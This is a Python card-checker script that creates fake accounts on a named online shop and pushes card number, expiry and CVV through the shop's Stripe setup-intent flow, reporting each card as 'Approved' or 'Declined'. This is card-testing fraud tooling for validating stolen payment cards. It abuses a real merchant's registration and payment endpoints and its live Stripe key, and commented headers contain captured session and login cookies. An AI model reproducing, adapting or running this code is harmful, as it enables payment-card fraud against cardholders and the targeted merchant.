
import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid




direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class stripe3:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):
        try:
            session = requests.Session()
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://hagsartisan.com/my-account/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'pll_language=en; cookieyes-consent=consentid:RXVldUhiVzA4d3AyT2NHcmtYZ0x3Zml1TVduVXdGTzc,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=7dd649a1-16a6-42d8-ac1e-10d3fc635be208b1d7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; __stripe_sid=3e2e3f5b-0c15-407f-9513-bbc5f1f452f12c9e87; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhagsartisan.com%2Fmy-account%2F',
            }

            response = session.get('https://hagsartisan.com/my-account/',  headers=headers).text
            reg = find_between(response, 'name="woocommerce-register-nonce" value="', '"')
            print(reg)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://hagsartisan.com',
                'priority': 'u=0, i',
                'referer': 'https://hagsartisan.com/my-account/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'pll_language=en; cookieyes-consent=consentid:RXVldUhiVzA4d3AyT2NHcmtYZ0x3Zml1TVduVXdGTzc,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=7dd649a1-16a6-42d8-ac1e-10d3fc635be208b1d7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; __stripe_sid=3e2e3f5b-0c15-407f-9513-bbc5f1f452f12c9e87; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhagsartisan.com%2Fmy-account%2F',
            }

            data = {
                'email': self.CorreoRand,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://hagsartisan.com/product/orbit-grove-shaving-soap/',
                'wc_order_attribution_session_start_time': '2026-01-25 03:01:36',
                'wc_order_attribution_session_pages': '14',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': reg,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }

            response = session.post('https://hagsartisan.com/my-account/', headers=headers, data=data)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://hagsartisan.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'pll_language=en; cookieyes-consent=consentid:RXVldUhiVzA4d3AyT2NHcmtYZ0x3Zml1TVduVXdGTzc,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=7dd649a1-16a6-42d8-ac1e-10d3fc635be208b1d7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; __stripe_sid=3e2e3f5b-0c15-407f-9513-bbc5f1f452f12c9e87; wordpress_logged_in_52714d0b3afaf5c2722a65759b3328c0=sadqwdkjejk%7C1770520811%7C98toMgoXHks71QWzpqBoJsFi4gFRo1qSLj5o4u6PwEt%7C0daa90c90a7e67a77fdbe9e053b44e5bfdc54b30110d3c2395be59df6c9e00d9; sbjs_session=pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhagsartisan.com%2Fmy-account%2Fpayment-methods%2F',
            }

            response = session.get('https://hagsartisan.com/my-account/add-payment-method/',  headers=headers).text
            ajas = find_between(response, '"createAndConfirmSetupIntentNonce":"','"')
            print(ajas)
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.6',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={self.cc}&card[cvc]={self.cvv}&card[exp_year]={self.ano}&card[exp_month]={self.mes}&allow_redisplay=unspecified&billing_details[address][country]=GR&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhagsartisan.com&time_on_page=198214&client_attribution_metadata[client_session_id]=d71b0ca4-8035-4071-9334-23ed609f62e8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=b41b2684-bab9-4100-9d49-97f6b66ee4ed&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51STqwqH6sgxFXlkR3Z45HUPpnVva5RsUhMM6eLVf3TNf8c0yYU6HxX5096yT63rymMCWr0Ed9FEbDvGf2XxtoQMY00nY0dxMdC&_stripe_version=2024-06-20&radar_options'
            response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            id = response['id']
            print(id)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://hagsartisan.com',
                'priority': 'u=1, i',
                'referer': 'https://hagsartisan.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_52714d0b3afaf5c2722a65759b3328c0=sadqwdkjejk%7C1770520811%7C98toMgoXHks71QWzpqBoJsFi4gFRo1qSLj5o4u6PwEt%7C5ac528c7d0a75ddd3b976f4032cdf9a4b8242b498af640555603099bc92dadf0; pll_language=en; cookieyes-consent=consentid:RXVldUhiVzA4d3AyT2NHcmtYZ0x3Zml1TVduVXdGTzc,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=7dd649a1-16a6-42d8-ac1e-10d3fc635be208b1d7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2003%3A01%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fhagsartisan.com%2Fproduct%2Forbit-grove-shaving-soap%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; __stripe_sid=3e2e3f5b-0c15-407f-9513-bbc5f1f452f12c9e87; wordpress_logged_in_52714d0b3afaf5c2722a65759b3328c0=sadqwdkjejk%7C1770520811%7C98toMgoXHks71QWzpqBoJsFi4gFRo1qSLj5o4u6PwEt%7C0daa90c90a7e67a77fdbe9e053b44e5bfdc54b30110d3c2395be59df6c9e00d9; sbjs_session=pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhagsartisan.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajas,
            }

            response = session.post('https://hagsartisan.com/wp-admin/admin-ajax.php',  headers=headers, data=data)
            data = response.json()
            print(data)
            error = data['success'] and data['data']['status'] == 'succeeded'
            if error: return 'Approved! ✅', data['data']['status']
            else: return 'Declined ❌', data['data']['status']
        except: return 'Declined ❌','Your card was declined.'